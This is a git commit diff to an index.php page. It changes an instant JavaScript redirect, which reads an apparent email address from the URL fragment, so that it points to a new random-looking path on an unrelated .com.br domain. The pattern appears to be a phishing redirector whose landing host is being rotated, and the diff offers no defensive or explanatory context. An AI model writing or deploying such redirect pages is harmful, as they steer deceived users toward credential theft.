8663854c28e645bfd78a5bc32910f7464e3a2038
e2tye87 <101043196+e2tye87@users.noreply.github.com>
2022-03-08 17:11:03 +0000

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://colegiocnv.com.br/edhtdthd";
+			window.location.href = "https://totallcheck-up.com.br/takauiegb";
 		}, 0);
 	</script>
 </html>
